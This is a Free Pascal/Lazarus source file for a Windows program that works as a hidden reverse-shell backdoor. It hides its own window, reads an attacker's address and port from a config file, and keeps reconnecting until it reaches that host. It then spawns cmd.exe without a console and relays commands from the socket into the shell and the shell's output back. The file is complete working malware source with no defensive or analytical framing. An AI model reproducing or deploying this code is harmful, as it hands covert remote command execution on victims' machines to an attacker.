unit UnitPrinc;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, process, FileUtil, Forms, Controls, Graphics, Dialogs,
  ExtCtrls, StdCtrls, lNetComponents, lNet;

type

  { TFormPrinc }

  TFormPrinc = class(TForm)
    LTCPComponent: TLTCPComponent;
    Process: TProcess;
    TimerTentaConectar: TTimer;
    TimerProcess: TTimer;
    procedure FormShow(Sender: TObject);
    procedure LTCPComponentReceive(aSocket: TLSocket);
    procedure TimerProcessTimer(Sender: TObject);
    procedure TimerTentaConectarTimer(Sender: TObject);
  private
    { private declarations }
  public
    { public declarations }
  end;

var
  FormPrinc: TFormPrinc;
  RCmd : String;
  Endereco : String;
  Porta : Integer;
implementation

{$R *.lfm}

{ TFormPrinc }

procedure TFormPrinc.FormShow(Sender: TObject);
var
  RArqConf : TStringList;
begin
  Visible := False;
  RArqConf := TStringList.Create;
  if FileExists(ExtractFilePath(Application.ExeName) + 'endereco.conf.txt') then
  begin
    RArqConf.LoadFromFile(ExtractFilePath(Application.ExeName) + 'endereco.conf.txt');
    Endereco := RArqConf[0];
    Porta  := StrToInt(RArqConf[1]);
    RCmd := '';
  end
  else
  begin
    Application.Terminate;
  end;
end;

procedure TFormPrinc.LTCPComponentReceive(aSocket: TLSocket);
begin
  if aSocket.GetMessage(RCmd) > 0 then
  begin
    RCmd := RCmd + #10;
    Process.Input.Write(RCmd[1], Length(RCmd));
    RCmd := '';
  end;
end;


procedure TFormPrinc.TimerProcessTimer(Sender: TObject);
var
  RSaida : TStringList;
begin
  TimerProcess.Enabled := False;
  RSaida := TStringList.Create;
  if Process.Output.NumBytesAvailable > 0 then
    RSaida.LoadFromStream(Process.Output);
  if LTCPComponent.Connected then
  begin
    if Length(RSaida.Text) > 0 then
      LTCPComponent.SendMessage(RSaida.Text);
  end
  else
  begin
    TimerTentaConectar.Enabled := True;
  end;
  RSaida.Free;
  TimerProcess.Enabled := True;
end;

procedure TFormPrinc.TimerTentaConectarTimer(Sender: TObject);
begin
  TimerTentaConectar.Enabled := False;
  if LTCPComponent.Connect(Endereco,Porta) then
  begin
    Process.CommandLine := 'cmd.exe';
    Process.Options := Process.Options + [poUsePipes, poNoConsole,
     poStderrToOutPut];
    Process.Execute;
    TimerProcess.Enabled := True;
    TimerTentaConectar.Enabled := False;
    Exit;
  end
  else
  begin
    TimerTentaConectar.Enabled := True;
  end;
end;

end.

